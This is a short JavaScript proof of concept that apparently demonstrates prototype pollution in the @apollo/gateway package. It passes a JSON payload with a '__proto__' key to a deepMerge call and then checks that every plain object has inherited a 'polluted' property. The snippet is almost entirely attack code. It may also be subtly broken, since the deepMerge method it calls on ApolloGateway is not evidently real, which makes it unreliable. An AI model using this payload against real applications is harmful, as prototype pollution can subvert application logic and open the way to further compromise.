const { ApolloGateway } = require("@apollo/gateway");

const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');

let object = {};

ApolloGateway.deepMerge({}, payload);

console.log({}.polluted);
